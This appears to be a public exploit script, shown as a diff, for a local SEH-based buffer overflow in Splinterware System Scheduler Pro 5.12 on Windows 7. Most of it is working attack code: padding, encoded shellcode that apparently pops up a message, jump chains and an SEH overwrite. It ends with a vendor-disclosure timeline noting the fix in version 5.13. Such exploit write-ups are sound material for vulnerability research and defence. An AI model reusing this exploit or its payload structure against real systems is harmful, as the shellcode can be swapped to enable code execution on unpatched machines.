@@ -1,0 +1,88 @@
+#!/usr/bin/python
+
+#
+# Exploit Author: bzyo
+# Twitter: @bzyo_
+# Exploit Title: Splinterware System Scheduler Pro 5.12 - Local Buffer Overflow (SEH)
+# Date: 07-21-18
+# Vulnerable Software: System Scheduler Pro 5.12
+# Vendor Homepage: https://www.splinterware.com
+# Version: 5.12
+# Software Link: https://www.splinterware.com/download/ssproeval.exe
+# Tested Windows 7 SP1 x86
+#
+# 
+#
+# PoC
+# 1. generate sysschedule512.txt, copy contents to clipboard
+# 2. open application
+# 3. select view, preferences and in the Startup/Logging tab
+# 4. paste contents from clipboard to the logfile location field
+# 5. exit preferences
+# 6. create dummy task to open notepad.exe
+# 7. run task, notepad opens
+# 8. close notepad
+# 9. pop-up window appears and application crashes
+
+
+
+import struct
+
+filename="sysschedule512.txt"
+
+junk = "A"*55
+
+#thx giuseppe d'amore for edb-id 28996; edited pop-up msg & encoded
+#msfencode -e x86/alpha_mixed -i bzyo; size 287 
+msg = ("\x89\xe5\xda\xc4\xd9\x75\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x4a" 
+"\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x37\x52\x59" 
+"\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41" 
+"\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42" 
+"\x75\x4a\x49\x74\x71\x58\x52\x4c\x72\x30\x30\x52\x44\x6c" 
+"\x4b\x75\x42\x4c\x4b\x62\x72\x34\x4c\x4e\x6b\x30\x52\x45" 
+"\x4c\x6e\x6b\x73\x72\x56\x68\x6c\x4b\x64\x32\x31\x30\x6c" 
+"\x4b\x66\x72\x4d\x50\x33\x4e\x66\x6c\x50\x33\x32\x55\x39" 
+"\x62\x4f\x79\x6a\x67\x43\x33\x62\x58\x67\x4c\x6c\x4b\x56" 
+"\x37\x33\x48\x66\x61\x4a\x62\x4e\x6b\x51\x6a\x77\x50\x55" 
+"\x51\x49\x57\x66\x51\x58\x6d\x4e\x6b\x30\x34\x6c\x6f\x76" 
+"\x61\x69\x56\x57\x35\x4d\x51\x67\x4e\x31\x56\x35\x31\x74" 
+"\x34\x63\x51\x64\x35\x49\x62\x4f\x71\x43\x4e\x46\x68\x53" 
+"\x75\x53\x48\x71\x79\x64\x34\x30\x75\x5a\x49\x6c\x4b\x30" 
+"\x7a\x51\x34\x33\x31\x59\x57\x42\x46\x4c\x4b\x44\x6c\x50" 
+"\x6f\x4e\x6b\x52\x5a\x45\x4c\x65\x51\x4b\x77\x6e\x6b\x71" 
+"\x6c\x6e\x4f\x6b\x4c\x55\x51\x38\x47\x51\x78\x37\x51\x75" 
+"\x71\x37\x51\x76\x61\x65\x38\x71\x52\x61\x4a\x43\x69\x50" 
+"\x4f\x50\x68\x31\x30\x55\x71\x64\x61\x67\x51\x6d\x59\x48" 
+"\x61\x6b\x4e\x73\x79\x66\x6b\x44\x71\x6b\x70\x66\x31\x50" 
+"\x50\x49\x6f\x68\x57\x41\x41")
+
+junk1 = "B"*56
+
+#jmp back to As
+jmp3 = "\xe9\x6f\xfe\xff\xff"
+
+junk2= "C"*4
+
+#jmp back after random 8 nulls added
+jmp2 = "\xeb\xf5" 
+
+junk3 = "C"*10
+
+#jmp back before random 8 nulls added
+jmp = "\xeb\xf2\xcc\xcc"
+
+seh = struct.pack('<L',0x00413121)
+
+buffer = junk + msg + junk1 + jmp3 + junk2 + jmp2 + junk3 + jmp + seh 
+  
+textfile = open(filename , 'w')
+textfile.write(buffer)
+textfile.close()
+
+# Timeline
+#---------------------------------------------------------------------
+#05-02-18: Vendor notified of vulnerability
+#05-03-18: Initial vendor response
+#05-09-18: Issues resolved after some back and forth discussion
+#07-20-18: New version released, 5.13, with issue fixed
+#07-21-18: Submitted public disclosure
